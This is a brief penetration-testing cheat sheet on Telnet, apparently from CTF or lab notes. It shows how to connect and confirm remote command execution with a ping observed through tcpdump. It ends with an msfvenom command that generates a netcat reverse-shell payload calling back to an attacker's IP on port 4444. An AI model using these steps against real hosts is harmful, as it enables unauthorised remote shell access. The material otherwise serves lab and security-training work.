# Telnet

Via a telnet client, connect to and execute commands on a remote machine that's hosting a telnet server. Sends all messages in __clear text__.

```bash
telnet [IP] [PORT]
telnet 10.10.10.3 23
```

## Exploitation

* Start a tcpdump listener on attacking machine:

```bash
sudo tcpdump ip proto \\icmp -i eth0
```

* From target telnet session:

```bash
ping [attack_ip] -c 1
```

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
```
